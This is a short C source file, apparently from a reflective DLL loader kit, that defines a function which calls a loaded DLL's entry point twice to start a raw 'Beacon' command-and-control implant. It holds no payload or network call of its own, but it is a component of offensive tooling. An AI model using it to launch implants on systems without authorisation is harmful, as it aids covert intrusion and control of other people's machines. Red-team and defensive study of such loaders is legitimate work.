#include <windows.h>
#include "../compost.h"
#include "../tcg.h"

#define DLL_BEACON_START 4

void invoke_entrypoint(LOADED_DLL *dll) {
	// This one is very similar to "dll_entrypoint". It can be used to invoke a raw Beacon DLL.
	// After invoking the entrypoint initially, you need to call it a second time with DLL_BEACON_START.
	
	((DLLMAIN_FUNC) dll->entrypoint)((HINSTANCE)dll->base, DLL_PROCESS_ATTACH, NULL);
	((DLLMAIN_FUNC) dll->entrypoint)((HINSTANCE)NULL, DLL_BEACON_START, NULL);
}
